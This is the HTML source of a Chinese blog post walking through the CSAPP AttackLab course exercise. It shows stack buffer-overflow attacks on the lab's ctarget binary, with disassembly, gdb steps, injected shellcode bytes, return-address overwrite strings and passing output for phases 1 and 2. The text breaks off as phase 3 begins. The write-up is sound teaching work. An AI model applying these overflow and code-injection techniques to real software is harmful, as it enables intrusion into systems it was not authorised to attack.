@@ -1,0 +1,1223 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Chisato.png">
+  <link rel="icon" href="/img/Chisato.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#FDD692">
+  <meta name="author" content="Nishiki Chisato">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="attacklab  attacklab  准备  文件下载 文件组成 提交 说明  正式开始  Code Injection Attack  pahse_1 phase_2 phase_3  Return-Oriented Programming  phase_4 phase_5   总结   准备 文件下载 所有文件均可以从官网上直">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP_lab AttackLab">
+<meta property="og:url" content="https://nishikichisato.github.io/2023/06/27/CSAPP_LAB/AttkackLab/index.html">
+<meta property="og:site_name" content="Nishiki Chisato&#39;s Blog">
+<meta property="og:description" content="attacklab  attacklab  准备  文件下载 文件组成 提交 说明  正式开始  Code Injection Attack  pahse_1 phase_2 phase_3  Return-Oriented Programming  phase_4 phase_5   总结   准备 文件下载 所有文件均可以从官网上直">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://nishikichisato.github.io/img/CSAPP_lab/CSAPP_lab%20(3).jpg">
+<meta property="article:published_time" content="2023-06-27T07:11:58.812Z">
+<meta property="article:modified_time" content="2023-06-27T07:26:06.331Z">
+<meta property="article:author" content="Nishiki Chisato">
+<meta property="article:tag" content="CSAPP_lab">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://nishikichisato.github.io/img/CSAPP_lab/CSAPP_lab%20(3).jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>CSAPP_lab AttackLab - Nishiki Chisato&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/iconfont_leetcode/iconfont.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"nishikichisato.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":100},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":true,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"725e0a3ead10e3e31858a41d23c0faaa","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?725e0a3ead10e3e31858a41d23c0faaa";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Nishiki Chisato&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/hekari.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CSAPP_lab AttackLab"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Nishiki Chisato
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-27 15:11" pubdate>
+          June 27, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          15k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          121 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CSAPP_lab AttackLab</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    Last updated on a month ago
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="attacklab">attacklab</h1>
+<ul>
+<li><a href="#attacklab">attacklab</a>
+<ul>
+<li><a href="#准备">准备</a>
+<ul>
+<li><a href="#文件下载">文件下载</a></li>
+<li><a href="#文件组成">文件组成</a></li>
+<li><a href="#提交">提交</a></li>
+<li><a href="#说明">说明</a></li>
+</ul></li>
+<li><a href="#正式开始">正式开始</a>
+<ul>
+<li><a href="#code-injection-attack">Code Injection Attack</a>
+<ul>
+<li><a href="#pahse_1">pahse_1</a></li>
+<li><a href="#phase_2">phase_2</a></li>
+<li><a href="#phase_3">phase_3</a></li>
+</ul></li>
+<li><a href="#return-oriented-programming">Return-Oriented
+Programming</a>
+<ul>
+<li><a href="#phase_4">phase_4</a></li>
+<li><a href="#phase_5">phase_5</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#总结">总结</a></li>
+</ul></li>
+</ul>
+<h2 id="准备">准备</h2>
+<h3 id="文件下载">文件下载</h3>
+<p>所有文件均可以从官网上直接下载：<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/labs.html">Lab Assignments</a></p>
+<p>与前两个使用不同的是，本实验需要严格按照 <a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">PDF</a> 内的说明完成</p>
+<h3 id="文件组成">文件组成</h3>
+<p>主要文件有三个：</p>
+<ul>
+<li><p><code>ctarget</code>：为 <code>code-injection</code> 攻击，用于
+<code>phase 1</code> 到 <code>phase 3</code></p></li>
+<li><p><code>rtarget</code>：为 <code>return-oriented programming</code>
+攻击，用于 <code>phase 4</code> 到 <code>phase 5</code></p></li>
+<li><p><code>hex2raw</code>：用于生成攻击字符串</p></li>
+</ul>
+<p>一个 <code>cookie.txt</code> 文件用于充当验证码的角色，后面会用到</p>
+<h3 id="提交">提交</h3>
+<p><code>ctarget</code> 与 <code>rtarget</code> 的用法一致：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stata">Usage: [-hq] ./ctarget -i &lt;<span class="hljs-keyword">infile</span>&gt; <br>  -<span class="hljs-keyword">h</span>          <span class="hljs-keyword">Print</span> <span class="hljs-keyword">help</span> information<br>  -q          Don&#x27;t submit result to server<br>  -i &lt;<span class="hljs-keyword">infile</span>&gt; <span class="hljs-keyword">Input</span> <span class="hljs-keyword">file</span><br><br>Usage: [-hq] ./rtarget -i &lt;<span class="hljs-keyword">infile</span>&gt; <br>  -<span class="hljs-keyword">h</span>          <span class="hljs-keyword">Print</span> <span class="hljs-keyword">help</span> information<br>  -q          Don&#x27;t submit result to server<br>  -i &lt;<span class="hljs-keyword">infile</span>&gt; <span class="hljs-keyword">Input</span> <span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure>
+<p>我们不提交到服务器，因此需要带 <code>-q</code> 参数运行</p>
+<p><code>hex2raw</code> 的用法为：</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sas">usage: ./hex2raw [-h] [i <span class="hljs-keyword">IN</span>] [-o <span class="hljs-keyword">OUT</span>]<br> -h Print this help <span class="hljs-keyword">message</span><br> -i <span class="hljs-keyword">IN</span> specify <span class="hljs-keyword">input</span> text <span class="hljs-keyword">file</span><br> -o <span class="hljs-keyword">OUT</span> specify <span class="hljs-keyword">output</span> data <span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure>
+<p>当然，可以直接
+<code>./hex2raw &lt; input_file &gt; output_file</code>，而前两个不能这样子（需要带
+<code>-q</code> 参数运行）</p>
+<h3 id="说明">说明</h3>
+<p><code>ctarget</code> 和 <code>rtarget</code>
+的输入均是从标准输入读取，二者均是通过函数 <code>getbuf</code>
+实现：</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">unsigned <span class="hljs-built_in">getbuf</span>()<br>&#123;<br>  char buf<span class="hljs-selector-attr">[BUFFER_SIZE]</span>;<br>  <span class="hljs-built_in">Gets</span>(buf);<br>  return <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这里的 <code>Gets</code> 函数与标准库的 <code>gets</code>
+函数行为一致，均是从标准库读取而<strong>不做任何的边界检查</strong></p>
+<hr>
+<h2 id="正式开始">正式开始</h2>
+<h3 id="code-injection-attack">Code Injection Attack</h3>
+<h4 id="pahse_1">pahse_1</h4>
+<p>参照 <a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">PDF</a> 中
+<code>4.1</code> 的部分</p>
+<p>在 <code>test</code> 函数中会调用 <code>getbuf</code>，我们的任务是在
+<code>getbuf</code> 执行完之后不再返回 <code>test</code> 函数而是返回到
+<code>touch1</code> 函数</p>
+<p>我们考察 <code>getbuf</code> 函数行为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004017a8 &lt;getbuf&gt;:<br>  4017a8:	48 83 ec 28          	sub    $0x28,%rsp<br>  4017ac:	48 89 e7             	mov    %rsp,%rdi<br>  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;<br>  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax<br>  4017b9:	48 83 c4 28          	add    $0x28,%rsp<br>  4017bd:	c3                   	ret    <br>  4017be:	90                   	nop<br>  4017bf:	90                   	nop<br></code></pre></td></tr></table></figure>
+<p>函数开始时会分配 <code>0x28</code> 也就是 <code>40</code>
+字节的堆栈，随后调用 <code>Gets</code> 函数</p>
+<blockquote>
+<p>需要说明的是，我们的内存地址为 <code>64</code>
+位，并且在内存当中以小端存储</p>
+</blockquote>
+<p>在调用 <code>getbuf</code> 函数之前，<code>call</code> 指令便会将
+<code>getbuf</code> 的下一条指令的地址压入其过程的栈帧中，之后的部分才是
+<code>getbuf</code> 过程的栈帧</p>
+<p>因此我们可以用零来将那 <code>40</code> 个字节全部填充，然后在原先是
+<code>call</code> 函数返回地址的地方写入 <code>touch1</code> 的地址</p>
+<p><code>touch1</code>
+的地址为：<code>0x4017c0</code>，前面补零并用小端表示为：<code>0xc0 17 40 00</code></p>
+<p>因此最终答案为：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">c0</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./hex2raw &lt; answer/phase_1/input &gt; answer/phase_1/output<br>$ ./ctarget -qi answer/phase_1/output <br>Cookie: 0x59b997fa<br>Touch1!: You called touch1()<br>Valid solution <span class="hljs-keyword">for</span> level 1 with target ctarget<br>PASS: Would have posted the following:<br>        user <span class="hljs-built_in">id</span> bovik<br>        course  15213-f15<br>        lab     attacklab<br>        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 <br></code></pre></td></tr></table></figure>
+<h4 id="phase_2">phase_2</h4>
+<p>参照 <a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">PDF</a> 中
+<code>4.2</code> 的部分</p>
+<p>与上一步类似，我们在调用 <code>getbuf</code> 函数之后不能返回到
+<code>test</code> 而是要到 <code>touch2</code></p>
+<p>需要注意的是，<code>touch2</code> 函数是带有参数的，我们需要让参数
+<code>val</code> 的值与 <code>cookie</code>
+的值相同即可，这便是本题需要解决的问题</p>
+<blockquote>
+<p>我们首先需要知道一点：程序计数器 <code>PC</code>
+所指向的内存地址就是下一条指令的字节级编码，因此如果我们希望程序去执行我们期望的代码，我们<strong>除了需要将代码的字节级编码插入到内存中以外，还需要将
+<code>PC</code> 的值设置对应的地址</strong></p>
+</blockquote>
+<p>我们重新把目光放到 <code>getbuf</code> 函数上：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004017a8 &lt;getbuf&gt;:<br>  4017a8:	48 83 ec 28          	sub    $0x28,%rsp<br>  4017ac:	48 89 e7             	mov    %rsp,%rdi<br>  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;<br>  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax<br>  4017b9:	48 83 c4 28          	add    $0x28,%rsp<br>  4017bd:	c3                   	ret    <br>  4017be:	90                   	nop<br>  4017bf:	90                   	nop<br></code></pre></td></tr></table></figure>
+<p>我们发现这个函数只是简单的分配 <code>40</code>
+字节大小的栈帧，随后<strong>调用 <code>Gets</code> 函数对该
+<code>40</code>
+字节的区域进行写入</strong>，仅仅只是写入，并不会当成指令执行</p>
+<p>当 <code>getbuf</code> 结束时，<code>ret</code>
+指令会弹出一个跳转地址，然后 <code>PC</code>
+便会跳转到该地址开始执行指令（也就是在 <code>test</code> 中
+<code>getbuf</code> 函数的下一条指令的地址）</p>
+<p>也就是说，<code>ret</code>
+指令相当于执行：<code>PC = *rsp, rsp++</code></p>
+<p>那么如果我们需要跳转到某个地址开始执行指令的话，只能用
+<code>ret</code> 的方式（因为该指令会设置 <code>PC</code>
+的值）。具体地，先将待跳转地址压入栈中，随后执行 <code>ret</code>
+指令即可</p>
+<p>到此为止，我们便可以正式开始代码插入了，我们的需求是：</p>
+<ul>
+<li>将 <code>%rdi</code> 的值改为 <code>cookie</code></li>
+<li>跳转到 <code>touch2</code> 执行代码（先将地址压入栈中，随后使用
+<code>ret</code> 指令）</li>
+</ul>
+<p>由于我们不知道这三条指令的字节级编码，因此我们先用汇编语言写出来，随后用
+<code>gcc</code> 带 <code>-c</code> 参数进行汇编（<code>-c</code>
+表示值编译和汇编而不进行链接），得到可执行程序后用 <code>objdump</code>
+进行反汇编即可得到指令对应的字节级编码</p>
+<p>在 <code>insert.s</code> 文件中，汇编代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov $0x59b997fa, %rdi<br>push $0x4017ec<br>ret<br><br></code></pre></td></tr></table></figure>
+<p>执行如下语句：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -c insert.s -o insert<br>objdump -d insert &gt; insert.asm<br></code></pre></td></tr></table></figure>
+<p><code>insert.asm</code> 的内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000000000 &lt;.text&gt;:<br>   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi<br>   7:	68 ec 17 40 00       	push   $0x4017ec<br>   c:	c3                   	ret    <br></code></pre></td></tr></table></figure>
+<p>因此我们插入的字节级数据便得到了。但如果直接将以下内容写入，我们是得不到想要的结果的</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">48</span> c7 c7 fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">68</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+<p>正如我们刚才分析的那样，<code>Gets</code>
+函数<strong>仅仅是对栈空进进行写入</strong>，程序计数器 <code>PC</code>
+的值并没有执行栈顶，因此也就不会执行对应的代码</p>
+<p><code>getbuf</code> 函数结束后会执行一次 <code>ret</code>，我们在
+<code>phase_1</code> 阶段将这个值覆盖为 <code>touch1</code>
+的地址，我们在这里将其覆盖为栈顶地址，这样 <code>PC</code>
+就可以执行栈顶了</p>
+<p>也就是说，我们需要找到在 <code>getbuf</code> 中，<code>%rsp</code>
+下降 <code>40</code> 字节后的地址</p>
+<p>我们启动 <code>cgdb</code> 开始调试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">cgdb ./ctarget<br><br><span class="hljs-comment"># 在 getbuf 处打断点</span><br>(gdb) b getbuf <br>Breakpoint 1 at 0x4017a8: file buf.c, line 12.<br><br>Breakpoint 1, getbuf () at buf.c:12<br>12      <span class="hljs-keyword">in</span> buf.c<br>(gdb) n<br>14      <span class="hljs-keyword">in</span> buf.c<br>(gdb) i r rsp<br>rsp            0x5561dc78          0x5561dc78<br></code></pre></td></tr></table></figure>
+<p>我们看到分配完 <code>40</code> 字节后的 <code>%rsp</code> 的地址为
+<code>0x5561dc78</code> ，将地址按小端排列后覆盖原先的
+<code>getbuf</code> 的返回地址，有：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">48</span> c7 c7 fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">68</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./ctarget -qi ./answer/phase_2/output <br>Cookie: 0x59b997fa<br>Touch2!: You called touch2(0x59b997fa)<br>Valid solution <span class="hljs-keyword">for</span> level 2 with target ctarget<br>PASS: Would have posted the following:<br>        user <span class="hljs-built_in">id</span> bovik<br>        course  15213-f15<br>        lab     attacklab<br>        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 <br></code></pre></td></tr></table></figure>
+<h4 id="phase_3">phase_3</h4>
+<p>参照 <a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">PDF</a> 中
+<code>4.3</code> 的部分</p>
+<p>这里 <code>CMU</code>
+的教授给了个提示：<code>When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.</code></p>
+<p>意思是函数 <code>hexmatch</code> 和 <code>strncmp</code>
+的调用会将栈空间给覆盖，因此需要小心地存储 <code>cookie</code>
+所表示的字符串</p>
+<p><code>hexmatch</code> 函数的定义如下：</p>
